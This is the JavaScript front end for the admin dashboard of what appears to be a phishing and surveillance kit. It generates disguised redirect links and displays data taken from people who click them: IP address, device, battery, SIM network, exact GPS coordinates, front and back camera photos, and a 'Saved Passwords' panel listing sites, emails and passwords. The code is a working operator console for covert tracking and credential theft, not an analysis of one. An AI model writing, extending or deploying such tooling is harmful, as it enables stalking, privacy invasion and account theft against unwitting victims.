let socket;
let currentVisitorId = null;

// Connect to Socket.io
socket = io();

// Check if admin is logged in
fetch('/api/visitors')
    .then(response => {
        if (response.status === 401) {
            window.location.href = '/';
        }
        return response.json();
    })
    .catch(() => {
        window.location.href = '/';
    });

// Socket event listeners
socket.on('visitor-connected', (visitor) => {
    loadVisitors();
    updateStats();
    showNotification(`🟢 New visitor connected!`);
});

socket.on('visitor-disconnected', (visitorId) => {
    loadVisitors();
    updateStats();
});

socket.on('camera-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

socket.on('location-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

// Generate custom link
function generateCustomLink() {
    const url = document.getElementById('customUrl').value;
    if (!url) {
        alert('Please enter a URL');
        return;
    }
    
    fetch('/generate-custom-link', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ redirectUrl: url })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const container = document.getElementById('generatedLinkContainer');
            const linkInput = document.getElementById('generatedLink');
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            
            container.style.display = 'block';
            linkInput.value = data.link;
            redirectDisplay.textContent = data.redirectUrl;
            
            showNotification('✅ Link generated successfully!');
        }
    })
    .catch(error => {
        alert('Error generating link: ' + error.message);
    });
}

// Load visitors
function loadVisitors() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            displayVisitors(visitors);
        });
}

// Display visitors with advanced details
function displayVisitors(visitors) {
    const container = document.getElementById('visitorsList');
    container.innerHTML = '';
    
    visitors.forEach(visitor => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        
        let detailsHTML = `
            <div class="visitor-header">
                <div>
                    <strong>ID: ${visitor.id.substring(0, 8)}</strong>
                    <div style="font-size: 14px; color: #666; margin-top:5px;">
                        📱 ${visitor.deviceName || 'Unknown'} 
                        ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                    </div>
                </div>
                <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                    ${visitor.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="margin-top: 10px; font-size: 14px;">
                ${visitor.location ? `
                    <span>📍 ${visitor.location.state || ''} ${visitor.location.city || ''} ${visitor.location.country || ''}</span>
                ` : ''}
                ${visitor.battery ? `• 🔋 ${visitor.battery}%` : ''}
                ${visitor.visitDate ? `• 📅 ${new Date(visitor.visitDate).toLocaleString()}` : ''}
            </div>
            <div style="margin-top:10px;">
                <button onclick="showVisitorDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
                <button onclick="deleteVisitor('${visitor.id}')" class="camera-btn" style="background:#fc8181;">🗑️ Delete</button>
            </div>
        `;
        
        // Add camera preview if available
        if (visitor.cameraData) {
            detailsHTML += `
                <div style="margin-top:10px;">
                    <img src="${visitor.cameraData}" alt="Visitor Photo" style="max-width:100px; border-radius:5px;">
                </div>
            `;
        }
        
        card.innerHTML = detailsHTML;
        container.appendChild(card);
    });
}

// Show visitor details
function showVisitorDetails(visitorId) {
    currentVisitorId = visitorId;
    const container = document.getElementById('detailsContent');
    const detailsDiv = document.getElementById('visitorDetails');
    
    fetch(`/api/visitor/${visitorId}`)
        .then(response => response.json())
        .then(visitor => {
            detailsDiv.style.display = 'block';
            
            let detailsHTML = `
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <!-- Visitor Info -->
                    <div>
                        <h3>👤 Visitor Information</h3>
                        <div class="visitor-details-grid">
                            <div class="detail-card">
                                <label>🆔 Visitor ID</label>
                                <div class="value">${visitor.id}</div>
                            </div>
                            <div class="detail-card">
                                <label>📱 Device</label>
                                <div class="value">${visitor.deviceName || 'Not available'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🌐 IP Address</label>
                                <div class="value">${visitor.ip || 'Not available'}</div>
                            </div>
                            <div class="detail-card">
                                <label>📶 Network</label>
                                <div class="value">${visitor.networkName || 'Not available'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🔋 Battery</label>
                                <div class="value">${visitor.battery || 'Not available'}%</div>
                            </div>
                            <div class="detail-card">
                                <label>📅 Visit Date</label>
                                <div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'Not available'}</div>
                            </div>
                            <div class="detail-card">
                                <label>📶 SIM Network</label>
                                <div class="value">${visitor.simNetwork || 'Not available'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🟢 Status</label>
                                <div class="value">${visitor.connected ? 'Online' : 'Offline'}</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Location Info -->
                    <div>
                        <h3>📍 Location Details</h3>
                        ${visitor.location ? `
                            <div class="visitor-details-grid">
                                <div class="detail-card">
                                    <label>🌍 Country</label>
                                    <div class="value">${visitor.location.country || 'Not available'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>🏛️ State</label>
                                    <div class="value">${visitor.location.state || 'Not available'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>🏙️ City</label>
                                    <div class="value">${visitor.location.city || 'Not available'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>📍 Latitude</label>
                                    <div class="value">${visitor.location.lat || 'Not available'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>📍 Longitude</label>
                                    <div class="value">${visitor.location.lng || 'Not available'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>🗺️ Maps</label>
                                    <div class="value">
                                        <a href="https://www.google.com/maps?q=${visitor.location.lat},${visitor.location.lng}" target="_blank">View on Map</a>
                                    </div>
                                </div>
                            </div>
                        ` : '<p>Location not available</p>'}
                        
                        <!-- Camera Photos -->
                        <h3 style="margin-top:20px;">📸 Camera Photos</h3>
                        <div style="display:flex; gap:10px; flex-wrap:wrap;">
                            ${visitor.frontCamera ? `
                                <div>
                                    <p><strong>Front Camera</strong></p>
                                    <img src="${visitor.frontCamera}" class="camera-image">
                                </div>
                            ` : ''}
                            ${visitor.backCamera ? `
                                <div>
                                    <p><strong>Back Camera</strong></p>
                                    <img src="${visitor.backCamera}" class="camera-image">
                                </div>
                            ` : ''}
                        </div>
                        
                        <!-- Saved Passwords -->
                        <h3 style="margin-top:20px;">🔑 Saved Passwords</h3>
                        ${visitor.savedPasswords ? `
                            <div class="visitor-details-grid">
                                ${visitor.savedPasswords.map(pwd => `
                                    <div class="detail-card">
                                        <label>${pwd.site || 'Website'}</label>
                                        <div class="value">Email: ${pwd.email || 'N/A'} | Password: ${pwd.password || 'N/A'}</div>
                                    </div>
                                `).join('')}
                            </div>
                        ` : '<p>No saved passwords found</p>'}
                    </div>
                </div>
            `;
            
            container.innerHTML = detailsHTML;
        });
}

// Delete visitor
function deleteVisitor(visitorId) {
    if (!confirm('Are you sure you want to delete this visitor data?')) {
        return;
    }
    
    fetch(`/api/visitor/${visitorId}`, {
        method: 'DELETE'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showNotification('🗑️ Visitor deleted successfully!');
            loadVisitors();
            updateStats();
            document.getElementById('visitorDetails').style.display = 'none';
        }
    })
    .catch(error => {
        alert('Error deleting visitor: ' + error.message);
    });
}

// Update dashboard statistics
function updateStats() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            document.getElementById('totalVisitors').textContent = visitors.length;
            document.getElementById('activeVisitors').textContent = 
                visitors.filter(v => v.connected).length;
            document.getElementById('totalLinks').textContent = visitors.length;
        });
}

// Copy link to clipboard
function copyLink() {
    const linkInput = document.getElementById('generatedLink');
    linkInput.select();
    document.execCommand('copy');
    showNotification('📋 Link copied to clipboard!');
}

// Logout
function logout() {
    window.location.href = '/';
}

// Show notification
function showNotification(message) {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();
    
    const div = document.createElement('div');
    div.className = 'notification';
    div.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #48bb78;
        color: white;
        padding: 15px 25px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        z-index: 1000;
        max-width: 400px;
    `;
    div.textContent = message;
    document.body.appendChild(div);
    
    setTimeout(() => {
        div.style.opacity = '0';
        div.style.transition = 'opacity 0.5s';
        setTimeout(() => div.remove(), 500);
    }, 3000);
}

// Initial load
loadVisitors();
updateStats();

// Auto-refresh every 10 seconds
setInterval(() => {
    loadVisitors();
    updateStats();
}, 10000);